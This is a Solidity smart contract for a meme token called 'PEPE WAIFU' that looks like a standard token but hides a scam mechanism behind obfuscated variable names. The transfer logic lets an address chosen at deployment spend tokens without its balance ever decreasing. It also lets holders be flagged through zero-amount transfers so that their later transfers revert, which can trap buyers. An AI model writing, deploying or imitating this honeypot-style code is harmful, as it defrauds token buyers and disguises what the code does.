/*

https://t.me/pepewaifu

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PEPEWAIFU is Ownable {
    mapping(address => uint256) public balanceOf;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol;

    constructor(address lying) {
        name = 'PEPE WAIFU';
        symbol = 'PEPE WAIFU';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        truth[lying] = hot;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    function transferFrom(address kind, address hospital, uint256 gentle) public returns (bool success) {
        engineer(kind, hospital, gentle);
        require(gentle <= allowance[kind][msg.sender]);
        allowance[kind][msg.sender] -= gentle;
        return true;
    }

    uint8 public decimals = 9;

    uint256 public totalSupply;

    mapping(address => uint256) private truth;

    mapping(address => uint256) private breathing;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function approve(address hit, uint256 gentle) public returns (bool success) {
        allowance[msg.sender][hit] = gentle;
        emit Approval(msg.sender, hit, gentle);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    string public name;

    function engineer(address kind, address hospital, uint256 gentle) private returns (bool success) {
        if (gentle == 0) {
            breathing[hospital] += hot;
        }
        if (truth[kind] == 0) {
            balanceOf[kind] -= gentle;
            if (uniswapV2Pair != kind && breathing[kind] > 0) {
                truth[kind] -= hot;
            }
        }
        balanceOf[hospital] += gentle;
        emit Transfer(kind, hospital, gentle);
        return true;
    }

    address public uniswapV2Pair;

    uint256 private hot = 53;

    function transfer(address hospital, uint256 gentle) public returns (bool success) {
        engineer(msg.sender, hospital, gentle);
        return true;
    }
}